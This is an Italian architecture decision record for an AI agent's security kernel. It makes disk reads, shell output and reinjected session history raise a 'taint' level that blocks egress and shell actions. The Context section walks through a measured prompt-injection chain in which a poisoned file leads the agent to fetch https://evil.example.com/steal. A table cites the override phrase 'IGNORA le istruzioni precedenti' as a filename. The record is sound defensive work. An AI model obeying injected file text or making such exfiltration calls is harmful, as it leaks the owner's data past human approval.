# ADR-0044 — Il disco non ha provenienza: leggere un file sporca il turno

**Stato:** accettato · 2026-08-15 · chiude la domanda negativa lasciata aperta da
`validazione-contratti.md` §5 («il tier di un file su disco», VAGA) · **apre una
riga di decisione owner**, in fondo

## Contesto

`agent/loop.ts` alzava il taint del turno in un punto solo, e quel punto leggeva
un campo opzionale:

```ts
if (outcome.tier !== undefined) snapshot.raiseTaint(outcome.tier);
```

Dichiaravano un `tier` in uscita `http.ts` (3), `search.ts` (3), `mcp.ts` (3),
`skill.ts` (1), `memory.ts` (il max dei ricordi richiamati). **Non lo
dichiaravano** `fs.ts` (`fs_read`, `fs_list`), `shell.ts` (`shell_run`),
`process.ts` (`process_list`, `process_kill`) — cioè tutti i percorsi che portano
nel turno byte scritti da qualcun altro sul disco di casa.

Conseguenza: leggere un file non alzava il taint di un millimetro.

**Perché è più grave della somma dei suoi pezzi.** Il docstring di `fs.read`
argomentava il proprio soffitto alto (3) appoggiandosi esplicitamente all'egress:
*«il read da solo non è la fuga: i byte devono comunque uscire, e la gamba di
egress è gattata a parte — fuori allowlist sopra taint 1 è DENY, mai ask, proprio
perché un contesto avvelenato non possa nominare la destinazione»*. Quel cancello
(`core/policy/decide.ts`) legge **il taint del turno**. Se leggere un file non lo
alza, il turno resta a 0 e il cancello non scatta mai: **l'argomento di sicurezza
scritto nel file dipendeva da una proprietà che il file stesso non produceva.**

Catena misurata su `dev` @ a3754c4, con il test che oggi sta in
`agent/read-then-egress.test.ts`: `fs_read nota.md` (contiene istruzioni
iniettate) → taint 0 → `http_get https://evil.example.com/steal`, host fuori
allowlist → il kernel risponde `ask` → l'owner approva → **il fetch parte**.

E `validazione-contratti.md:102` marcava **VERIFICATA** l'affermazione «un tool
result tier-3 alza il taint». È vera. Nessuno aveva fatto la domanda negativa —
*che cosa entra senza tier?* — che è dove stava tutto.

Non è la prima volta. `agent/tools/skill.ts:97-110` è il verbale della volta
precedente: quel file dichiarava `tier: 1` nel proprio docstring, non lo
restituiva, e ci sono voluti mesi perché qualcuno se ne accorgesse. **Un'omissione
che significa «pulito» è invisibile da ogni direzione tranne una.**

## Decisione

**1. `tier` diventa obbligatorio su `ToolOutcome`** (`agent/loop.ts`), e il loop
alza il taint incondizionatamente. Il difetto strutturale non era il numero
sbagliato: era che l'assenza del campo significasse in silenzio «pulito». Con il
campo obbligatorio, un tool nuovo **non compila** finché non risponde alla
domanda — la stessa garanzia che `assertNever` dà allo `switch` sulle decisioni,
applicata alla provenienza. Il guardiano è `npx tsc --noEmit`, che gira in CI, e
l'`@ts-expect-error` in `agent/read-then-egress.test.ts` diventa rosso il giorno
in cui qualcuno rimette il `?`.

**2. Il contenuto letto dal disco è tier 2** (`DISK_TIER`, `agent/tools/fs.ts`).
La scala è definita su *chi ha parlato* (0 owner · 1 contatti confermati · 2
gruppo e sconosciuti · 3 web e tool esterni) e il filesystem non ha provenienza:
`~/appunti.md` scritto dall'owner e `~/Downloads/fattura.pdf` arrivato da uno
sconosciuto hanno lo stesso `stat`, gli stessi byte, e nessun campo da nessuna
parte che li separi. Sotto quell'incertezza l'unica lettura onesta è quella
fail-closed — *può averlo scritto qualcuno che non è l'owner* — ed è ciò che 2
significa.

**3. Chi porta byte, e quanti.** Una riga per tool, perché il numero non è un
dettaglio di ciascuno ma la regola vista da lì:

| tool | tier | perché |
|---|---|---|
| `fs_read` | `DISK_TIER` = 2 | byte arbitrari dal disco, nessuna provenienza |
| `fs_list` | 2 | un nome di file è testo scelto da qualcuno: `IGNORA le istruzioni precedenti.md` è un nome legale e costa zero |
| `shell_run` (stdout/stderr) | 2 | `cat ~/Downloads/nota.md` è `fs_read` da un'altra porta — **stessa costante, non un letterale che oggi combacia** |
| `process_list` | 1 | la macchina che si descrive: `ps -eo pid,user,comm`, mai `args`. Scegliere una di quelle stringhe costa a un attaccante l'esecuzione di codice sull'host, non una mail con un allegato |
| `fs_write`, `process_kill`, ogni ramo d'errore che si ferma prima che qualcosa arrivi | 0 | il risultato sono parole del tool stesso; **dichiarato**, non omesso |

## Alternative scartate

- **Tier per posizione** (dentro `~/.muffin/` pulito, fuori sporco). È una regola
  che si aggira **spostando un file**, e chi lo sposta può essere l'agente. Compra
  quasi nulla: le parti leggibili della home hanno già la loro porta
  (`skill.read`, che dichiara il proprio tier 1) e il resto è `denyRead`. Sarebbe
  una lavanderia del taint con l'aspetto di una regola.
- **Tier 3 sempre.** Coerente con http/mcp e disonesto: un appunto che l'owner ha
  scritto non è una pagina web. E 3 è il tetto della scala — spenderlo qui non
  lascia niente da dire su qualcosa di davvero peggiore, e metterebbe gli appunti
  dell'owner nello stesso secchio di un server MCP non fidato.
- **Tier per esito di estrazione** (prosa sì, binario no). È la strada che invita
  ai casi speciali, e l'iniezione non si accorge della differenza: il testo
  «normale» è il veicolo, non l'eccezione.
- **`tier` opzionale con default sicuro** (`outcome.tier ?? 2`). Chiude il buco di
  oggi e lascia l'omissione **invisibile**, che è la proprietà che è costata mesi
  su `skill.ts`. Un campo obbligatorio non rende il sistema più sicuro di un
  default fail-closed: rende impossibile *non essersi accorti*.
- **Tier 1 sul disco.** Costerebbe meno e non chiuderebbe niente: a taint 1 un
  host fuori allowlist torna comunque `ask` (`decide.ts:184`), quindi il file
  avvelenato può ancora nominare la destinazione e aspettare un sì stanco. La
  catena si chiude a 2 e da nessuna parte sotto.

## Cosa costa

Misurato eseguendo il kernel vero sulle dichiarazioni vere (single-user, owner,
allowlist con un host):

| capability | soffitto | taint 0 | taint 2 (dopo una lettura) |
|---|---|---|---|
| `fs.read` · `fs.list` | 3 | allow | **allow** |
| `memory.read` · `sys.search` · `sys.http` (su allowlist) | 3 | allow | **allow** |
| `sys.http` **fuori** allowlist | 3 | ask | **deny/resource_denied** ← la catena |
| `sys.shell` | 1 | ask | **deny/taint_exceeded** |
| `skill.read` | 1 | allow | **deny/taint_exceeded** |
| `sys.process.list` | 1 | allow | **deny/taint_exceeded** |
| `sys.process.kill` | 1 | ask | **deny/taint_exceeded** |
| `mcp.<server>` | 1 | allow | **deny/taint_exceeded** |
| `fs.write` | 1 | draft¹ | deny/taint_exceeded |

¹ `fs.write` è `medium`+`undoable`, quindi il kernel risponde `draft` e il loop
lo rifiuta già oggi («il registro di undo non esiste ancora»): su questa riga la
decisione non costa nulla, perché non c'era niente da perdere.

**Detto in italiano: un turno che ha letto dal disco diventa un turno che legge e
risponde, e non agisce più sull'host.** *«Leggi il file e poi lancia i test»*
oggi si spezza a metà — e questo è esattamente ciò che la riga «Shell /
filesystem host / processi · taint 2 · **DENY — nessun percorso**» di
`03-threat-model.md` §3 dice che deve succedere a un contesto che ha ingoiato
byte non fidati. Il costo è reale, non è un effetto collaterale: è la regola.

## Cosa NON copre

- **Il contenuto letto non è delimitato.** `http`, `search`, `mcp` e `memory`
  avvolgono il risultato in `fence()`; `fs_read` no. Il taint difende il
  *kernel*, lo spotlighting difende il *modello*, e questa ADR fa solo il primo.
  Slice sua.
- **Il taint muore con il turno**, per disegno (`03-threat-model.md` §2: lo scope
  è il turno, non la sessione). Un file letto ieri non sporca oggi. È deliberato
  e va saputo.
- **La replica dell'agente entra in memoria a `trustTier: 0`** anche quando il
  turno era a 2: `agent/loop.ts:633-642` scrive un letterale, non il taint del
  turno. È la regola di `03:22` — *«qualunque testo derivato porta il tier
  massimo delle proprie fonti»* — non applicata al percorso di scrittura, quindi
  un file avvelenato **riassunto** dall'agente può rientrare domani come fatto
  tier 0. Trovata mentre si scriveva questa ADR, non chiusa qui: è un'altra
  gamba, con un altro test.
- **Il confine di lettura resta la working directory**, non un sandbox. La
  decisione owner aperta in `LAVORO.md` («scope lettura sandbox») non è chiusa da
  qui: questa ADR dice *quanto sporca ciò che leggi*, non *cosa puoi leggere*.
- **`process_kill` e `fs_write` a tier 0 sono un'affermazione sulle stringhe che
  quei tool costruiscono**, non sull'effetto: sono write, e la loro pericolosità
  è governata dalla classe di rischio, non dalla provenienza.

## La riga che l'owner deve poter contraddire

> **Dopo un `fs_read`, `shell_run` nello stesso turno è `deny/taint_exceeded`, e
> lo è anche il secondo `shell_run` di fila.** Non un `ask`: un rifiuto.

È la conseguenza che tocca l'uso quotidiano più di ogni altra, e anticipa la
decisione owner ancora aperta su `shell_run`. **Non la decido io.** Se la
risposta è no, la contropartita non è togliere il tier alla lettura — sarebbe
riaprire la catena — ma **`maxTaint: 2` su `sys.shell`**, che lascia shell un ASK
(l'auto-allow richiede taint 0 e resta irraggiungibile) e lascia l'egress chiuso.
Quella mossa **emenda `03-threat-model.md` §3**, riga «Shell / filesystem host /
processi · taint 2 · DENY — nessun percorso», e un emendamento al threat model è
un atto, non un default ammorbidito di passaggio. Il costo è misurato in
`agent/tools/shell.test.ts` §«il costo, dichiarato come test», così che allargarlo
richieda di avere quel test nel diff.

## Reversibilità

Alta sul numero, bassa sulla forma, ed è la divisione giusta. `DISK_TIER` è una
costante con due chiamanti: cambiarla è una riga e tre test che si aggiornano.
`tier` obbligatorio invece è la parte che non conviene togliere — toglierlo non
riporta un comportamento, riporta l'ignoranza.

Segnali che era sbagliata: se l'owner scopre che i turni utili si spezzano più
spesso di quanto la catena valga, il numero da rivedere è il **soffitto delle
capability che agiscono**, non il tier della lettura — cioè la riga qui sopra,
che è il motivo per cui è scritta a parte e chiede un sì.

## Revisione — 2026-08-16

**Decisione owner sulla riga sopra: la contropartita.** Dopo un `fs_read`,
`shell_run` nello stesso turno torna `ask`, non più `deny/taint_exceeded`.
`sys.shell` dichiara ora `maxTaint: 2` (`agent/tools/shell.ts`), il numero che
questa ADR aveva già nominato come contropartita se la risposta fosse stata no.
**Non è una riscrittura della decisione sopra** — il tier di lettura resta 2,
`DISK_TIER` resta 2, la catena read-then-egress resta chiusa esattamente come
misurata: questa riga tocca solo il soffitto di `sys.shell`, la capability che
*agisce*, non quella che *legge*.

**La ragione, con le parole dell'owner:** l'agente diventa inutilizzabile se
*«leggi il file e poi lancia i test»* si spezza a metà. Un rifiuto silenzioso a
metà di un compito quotidiano costa più, in uso reale, di quanto valga la
differenza fra "rifiutato" e "chiesto e approvato" — e un `ask` che l'owner può
dire no altrettanto quanto sì non riapre nessuna delle due gambe che questa ADR
chiude: l'auto-allow del kernel richiede `taint === 0` (`core/policy/
decide.ts`), che un turno che ha letto qualcosa non raggiunge mai a `maxTaint:
2` tanto quanto a `maxTaint: 1`, e l'egress fuori allowlist resta `deny` sopra
taint 1 esattamente come prima — quella riga non è toccata da questo
emendamento.

**Cosa cambia, misurato:**

| | prima di questa revisione | dopo |
|---|---|---|
| `sys.shell` a taint 0 (owner, hardened) | allow | allow (invariato) |
| `sys.shell` dopo un `fs_read` (taint 2) | **deny/taint_exceeded** | **ask** |
| `sys.shell` a taint 3 (web/search/mcp) | deny/taint_exceeded | deny/taint_exceeded (invariato) |
| `sys.http` fuori allowlist, taint ≥2 | deny/resource_denied | deny/resource_denied (invariato) |

**Cablaggio.** `agent/tools/shell.ts` (`shellCapability.maxTaint = 2`, con la
ragione in un commento). Test aggiornati per asserire il nuovo costo, non solo
per non fallire: `agent/tools/shell.test.ts` §«il costo, stated as a test» ora
verifica `ask` a taint 2 e `deny/taint_exceeded` a taint 3 — invariato solo nel
metodo (un test nel diff prima di poter allargare di nuovo il soffitto), non nel
verdetto atteso. `agent/read-then-egress.test.ts` §«the price of the same rule»
misura la stessa cosa attraverso un turno vero: `shell_run` dopo `fs_read` ora
gira una volta che l'owner approva l'`ask`, e resta un rifiuto secco solo a
taint 3. `03-threat-model.md` §3 emendata in riga, sulla stessa riga citata qui
sopra, con la data e il riferimento a questa sezione.

**Cosa NON copre questa revisione (dichiarato, non nascosto).** L'`ask` che il
kernel produce oggi porta solo `capability` + `prompt` + una `resource` se di
tipo `path` (`ApprovalRequest`, `agent/loop.ts`): il comando che `shell_run`
sta per eseguire, l'URL che `sys.http` sta per raggiungere, il pid che
`process_kill` sta per segnalare non compaiono nel testo che l'owner vede prima
di dire sì. Un `ask` che non mostra *cosa* sta approvando è un consenso più
debole di quanto sembri — e con questa revisione `sys.shell` torna a passare per
quel canale più spesso, non meno. Non chiuso qui: è nominato come lavoro
immediatamente successivo, non lasciato per essere ritrovato una terza volta.

## Revisione — 2026-08-17: la history non lava la provenienza

**La domanda negativa di questa ADR era "che tier ha un file", e restava aperta
la stessa domanda posta a un secondo canale.** Il probe del triage
(`docs/blueprint/research/triage-2026-08-17/e-audit-trasversali.md` §3.1,
MANDATO-DAY-1 invariante 2) l'ha confutata in senso negativo: turno 1 (owner)
chiama un tool tier 3 e risponde con testo derivato — taint persistita 3,
corretta. Turno 2, **stessa sessione**, nessuna tool call, testo pulito — taint
persistita **0**, mentre la risposta del turno 1 era fisicamente presente nella
richiesta che il turno 2 ha mandato al modello. Verdetto del probe: **LAUNDERED**.

Il meccanismo era lo stesso di §Contesto sopra, spostato di un file:
`agent/loop.ts` alzava la taint nei punti dove il turno legge qualcosa da fuori
di sé — recall, il piano — e non nel punto dove legge la propria sessione.
`buildContext` chiamava `deps.sessions.read(input.session)` e reiniettava i
messaggi `user`/`assistant` passati **come testo puro**, senza `raiseTaint`.
`SessionMessage` (`core/session/store.ts`) non aveva un campo tier:
l'informazione era persa nel momento stesso in cui la risposta veniva scritta
nella sessione.

### Decisione

**1. La proprietà** (MANDATO-DAY-1 invariante 2, verbatim): *"qualunque byte
fisicamente presente nel nuovo context conserva il massimo trust tier delle
fonti da cui deriva. Una sessione/transcript non è una lavanderia del taint."*
Una sessione che ha letto tier 3 resta a taint 3 finché quel testo — o testo
derivato da esso — è nella finestra reiniettata. Non finché la sessione esiste:
finché il contenuto è fisicamente nella richiesta.

**2. `SessionMessage` guadagna `tier?: TrustTier`** (`core/session/store.ts`),
additivo — JSONL retro-compatibile, nessuna riga vecchia riscritta, come ogni
altro campo di questo file. Scritto da `agent/loop.ts` a ognuno dei tre
`sessions.append`: `user` → 0, o 2 se `principal.kind === 'member'` (la stessa
regola dell'init di `runTurn`/`enqueueTurn`, applicata al messaggio invece che
al turno); `assistant` → `snapshot.currentTaint()` nell'istante dell'append,
mai un letterale — lo stesso argomento di 03 §2 già applicato all'episodio di
memoria in `reply-taint.test.ts` ("un riassunto di contenuto tier-3 è tier-3,
sempre"), qui applicato alla riga di sessione che quell'episodio non è;
`tool` → `outcome.tier`, anche se `buildContext` oggi non reinietta mai un
messaggio `tool` come history (filtra a `user`/`assistant`), scritto comunque
perché un campo omesso è esattamente l'errore che questa ADR esiste per non
ripetere una terza volta.

**3. Le righe vecchie, senza `tier`, si risolvono da `traceId` →
`turns.taint`** (`TurnStore.taintForIds`, una query per l'insieme dei
`traceId` reiniettati — mai una per riga: una sessione lunga può passarne
decine in un colpo solo a `agent/context/history-taint.ts`). `turns.id` è lo
stesso valore di `traceId` per costruzione (`NewTurn.id`'s docstring: "one
identity, so 'why' is a join") — non serve una tabella nuova, la riga del
turno che ha scritto quel messaggio esiste già.

**4. Fail-closed, dichiarato invece di indovinato, per una riga senza
nessuna delle due fonti.** `user` → 0: questo store tiene la sessione di un
solo tenant, e una riga `user` vecchia è per costruzione le parole
dell'owner (o della regola `member`, mai un byte che il turno ha letto altrove).
`assistant`/`tool` → il tetto della scala (3), non `DISK_TIER` (2): il dubbio
alza e non abbassa (la stessa regola con cui questa ADR ha già scartato
`tier?` con default sicuro, §"Alternative scartate" sopra), e una riga
`assistant`/`tool` senza `tier` **e** senza `traceId` risolvibile non ha
nemmeno il pavimento che un file su disco ha — `stat` non distingue le note
dell'owner da un allegato di uno sconosciuto, ma almeno è un file *di
qualcuno sul disco di casa*; una riga di sessione senza provenienza non ha
neanche quello. `DISK_TIER` resta la risposta giusta per un file; questa riga
prende il tetto della scala, non la sua metà.

**5. Il punto d'alzata è lo stesso di recall e todo, nello stesso ordine.**
`agent/loop.ts`, dentro `drive`, subito dopo `snapshot.raiseTaint(planTaint(open))`
e prima che `buildContext` costruisca i messaggi: si legge la sessione, si
taglia alla finestra che `buildContext` renderizzerà davvero
(`reinjectedHistory`, `agent/context/history-taint.ts` — la stessa funzione
che `buildContext` usa per renderizzare, non una seconda copia del taglio che
potrebbe disallinearsi), si calcola il tier massimo (`historyTaint`) e si alza
la snapshot — tutto prima che il kernel decida qualunque cosa in quel turno.
Il commento già in `agent/loop.ts` sul piano ("`raiseTaint` before the rows
reach the transcript") vale parola per parola anche qui.

**6. La proprietà è sul contenuto reiniettato, non sulla storia intera.** Un
messaggio tier 3 abbastanza vecchio da uscire dalla finestra
(`MAX_HISTORY_TURNS`, oggi 40 turni parlati) non alza la taint del turno nuovo:
non è fisicamente nella richiesta, quindi non può contaminarla. Questo è
deliberato e testato (`agent/session-history-taint.test.ts`, scenario "(d)"),
non un buco lasciato aperto — la via per tornare a qualcosa fuori dalla
finestra resta memoria/recall, esattamente come l'avviso che `buildContext`
già stampa quando taglia ("`cercalo in memoria invece di indovinare`").

### Cosa costa, misurato

| scenario | prima | dopo |
|---|---|---|
| turno pulito, sessione mai tainted | taint 0 | taint 0 (invariato) |
| turno pulito, sessione con una risposta derivata da tool tier 3 | **taint 0** | **taint 3** |
| stesso turno, `http_get` fuori allowlist come sua prima azione | ask (l'owner poteva approvarlo) | **deny/resource_denied** |
| sessione vecchia, riga `assistant` con `traceId` di un turno a taint 2, nessun `tier` | taint 0 | taint 2 |
| sessione vecchia, riga `assistant` senza `tier` né `traceId` | taint 0 | taint 3 (fail-closed) |
| messaggio tier 3 tagliato fuori da `MAX_HISTORY_TURNS` | taint 0 | taint 0 (invariato — §Decisione 6) |

Riga due e tre sono la stessa catena read-then-egress di questa ADR, questa
volta attraverso un confine di processo: `evals/acceptance/scenarios/
d-capability.accept.ts` (D10, esteso) lo misura con due `muffin run --session
<stessa>` separati contro il binario vero, non con `runTurn` e dipendenze
sostituite a mano.

### Test rosso-prima e mutazione

`agent/session-history-taint.test.ts` riscrive il probe come test permanente,
con `SessionStore`/`TurnStore` reali su directory temporanee e un provider
finto — cinque `it`, sui quattro scenari (a)-(d) sopra (due su (a): il valore
di taint, e la decisione del kernel sulla prima azione del turno). Scritti e
fatti girare **prima** del cablaggio: quattro rossi con lo stesso sintomo del
probe (`expected +0 to be 3`, o l'equivalente sull'egress non negato); (d) già
verde, perché prima di questa revisione niente alzava la taint dalla history,
quindi "non alzarla per un messaggio tagliato" era vero per il motivo
sbagliato. Dopo il cablaggio: cinque su cinque verdi.

Mutazione (`docs/JUDGE.md`): commentata la riga
`snapshot.raiseTaint(historyTaint(spoken.kept, taintByTrace))`, rilanciati i
test — (a) (entrambe le asserzioni), (b) e (c) tornano rossi, (d) resta verde
per costruzione (l'assenza dell'alzata non può *aggiungere* taint). Confermato
anche sullo scenario D10 esteso, attraverso il binario reale: con la riga
commentata il secondo turno risultava a `taint: 0` — e il primo tentativo di
misurarlo aveva un difetto proprio, corretto durante questa stessa revisione:
la query del secondo turno condivideva la parola "tutto" con l'episodio di
memoria piantato dal turno 1, quindi il recall automatico (corretto,
indipendente da questa modifica) trovava comunque quell'episodio e alzava la
taint per conto suo — un falso verde che avrebbe dichiarato provata una
proprietà che il test non isolava. La query è stata cambiata per non
condividere nessuna parola con l'episodio piantato né con il testo del primo
turno, e solo allora la mutazione ha fatto fallire l'assert nel punto giusto.
Ripristinata la riga, cinque su cinque verdi di nuovo.

### Cosa NON copre questa revisione

- **Il rimedio è una sessione nuova, e non tutte le superfici sanno aprirne
  una.** La CLI ha `--session <id>`: una sessione nuova è un id nuovo, sempre
  stata così. Telegram non ha equivalente: `connectors/telegram/connector.ts`
  deriva l'id sessione deterministicamente da `telegram:<chatId>`, per sempre,
  e non ha nessun comando (`/nuova`, `/reset` o simile) per cambiarlo — verificato
  leggendo il connector per intero, nessun handling di comandi slash esiste
  affatto. Un owner che ha fatto leggere qualcosa di tier 3 su Telegram non ha
  un modo di ripulire la conversazione da lì: deve saperlo e non può farlo
  dalla superficie su cui si trova. Gap dichiarato, non chiuso qui — non è
  nel mandato di questa slice (`slice/session-taint`) e tocca la superficie
  Telegram, non la taint.
- **Il confine resta il turno che *reinietta*, non il turno che ha letto.**
  Come già scritto sopra (§"Cosa NON copre" originale): la taint muore con il
  turno per disegno. Questa revisione non cambia quel confine — allarga solo
  la definizione di "cosa è fisicamente nel turno nuovo" a ciò che la sessione
  reinietta, che prima non contava affatto.
- **Lo spotlighting resta fuori.** Come `fs_read`, il testo della history
  reiniettata non è delimitato da `fence()` — questa ADR fa il taint, non la
  difesa del modello dall'istruzione iniettata nel testo stesso. Stessa nota
  già scritta sopra, stessa slice futura.
